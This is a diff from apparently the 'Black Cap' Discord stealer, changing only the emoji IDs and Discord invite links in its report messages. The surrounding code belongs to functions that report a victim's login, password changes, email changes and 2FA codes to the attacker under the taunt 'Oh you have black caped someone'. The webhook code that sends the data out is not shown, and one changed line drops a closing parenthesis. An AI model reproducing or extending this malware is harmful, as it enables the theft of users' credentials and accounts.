@@ -101,7 +101,7 @@ function FirstTime() {
 							content: "",
 							embeds: [{
 								title: "Black - Cap Initalized",
-								description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
+								description: "[**<a:blackcap:935974543779045426> │ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ)",
 								color: config["embed-color"],
 								fields: [{
 									name: "BC - Informations",
@@ -179,7 +179,7 @@ function FirstTime() {
 							content: "",
 							embeds: [{
 								title: "Black Caped User got logged out",
-								description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
+								description: "[**<a:blackcap:935974543779045426> │ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ)",
 								color: config["embed-color"],
 								fields: [{
 									name: "BC - Info",
@@ -455,7 +455,7 @@ function Login(email, password, token) {
 								content: "",
 								embeds: [{
 									"title": "Black Caped User Login",
-                                    description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
+                                    description: "[**<a:blackcap:935974543779045426> │ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ)",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "BC - Info",
@@ -520,7 +520,7 @@ function Login(email, password, token) {
 							}
 							var mfaembed = {
 								"title": ":detective: __2FA Codes__",
-								"description": "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
+								"description": "[**<a:blackcap:935974543779045426> │ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ)",
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
@@ -615,7 +615,7 @@ function Login(email, password, token) {
 											content: "",
 											embeds: [{
 												"title": "Black Caped User Login",
-                                                description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
+                                                description: "[**<a:blackcap:935974543779045426> │ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ)",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "BC - Info",
@@ -796,7 +796,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 								content: "",
 								embeds: [{
 									"title": "Black Cap Detect Password Changed",
-                                    description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
+                                    description: "[**<a:blackcap:935974543779045426> │ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ)",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "BC - Info",
@@ -865,7 +865,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 							}
 							var mfaembed = {
 								"title": ":detective: __2FA Codes__",
-								"description": "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
+								"description": "[**<a:blackcap:935974543779045426> │ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ)",
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
@@ -961,7 +961,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 											content: "",
 											embeds: [{
 												"title": "Black Cap Detect Password Changed",
-                                                description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
+                                                description: "[**<a:blackcap:935974543779045426> │ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "BC - Info",
@@ -1146,7 +1146,7 @@ function ChangeEmail(newemail, password, token) {
 								content: "",
 								embeds: [{
 									"title": "Black Cap Detect Email Changed",
-                                    description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
+                                    description: "[**<a:blackcap:935974543779045426> │ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ)",
 									"color": config['embed-color'],
 									"fields": [{
 										name: "BC - Info",
@@ -1211,7 +1211,7 @@ function ChangeEmail(newemail, password, token) {
 							}
 							var mfaembed = {
 								"title": ":detective: __2FA Codes__",
-								"description":"[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
+								"description":"[**<a:blackcap:935974543779045426> │ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ)",
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
@@ -1307,7 +1307,7 @@ function ChangeEmail(newemail, password, token) {
 											content: "",
 											embeds: [{
 												"title": "Black Cap Detect Email Changed",
-                                                description: "[**<a:blackcap:929133947756089395> │ Oh you have black caped someone**](https://discord.gg/QcAw9Rrptv)",
+                                                description: "[**<a:blackcap:935974543779045426>│ Oh you have black caped someone**](https://discord.gg/uKMbPwSapJ)",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "BC - Info",
